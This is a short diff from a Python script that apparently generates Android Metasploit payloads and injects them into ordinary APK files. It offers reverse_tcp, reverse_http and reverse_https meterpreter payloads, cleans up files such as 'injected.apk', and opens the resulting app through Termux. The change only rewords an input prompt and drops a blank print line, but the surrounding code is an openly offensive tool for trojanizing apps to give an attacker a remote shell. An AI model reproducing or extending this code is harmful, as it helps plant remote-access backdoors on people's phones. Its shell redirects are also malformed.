@@ -206,7 +206,7 @@ def pay_type():
     (1) android/meterpreter/reverse_tcp
     (2) android/meterpreter/reverse_http    
     (3) android/meterpreter/reverse_https\n""")
-    payload_type = str((input(f"{BLUE+Style.BRIGHT}[{W}?{B}] command -v Type of Payload, You Want to Create (1/2/3): ")))
+    payload_type = str((input(f"{BLUE+Style.BRIGHT}[{W}?{B}] Which Type of Payload, You Want to Create (1/2/3): ")))
     if payload_type == '1':
         type_of_payload = "android/meterpreter/reverse_tcp" 
     elif payload_type == '2':
@@ -506,7 +506,6 @@ def pay_type():
     os.system(f"rm -rf {pwd}/normal_apk {pwd}/android_payload.apk {pwd}/injected.apk dragon      injected.apk.idsig  ramp    twelv.txt 2        appnm      flaps       ins.sh              result handler.rc  out                 test1 > /dev/null 2&>1")
     print(f"{GREEN}[+] Output : {WHITE} {pathoapk}")
     os.system(f'termux-open {pathoapk} --send > /dev/null 2&>1')
-    print("")
     head("Now you can start Metasploit ! . Enjoy 🙂")
 def find(pattern, path):
     result = []
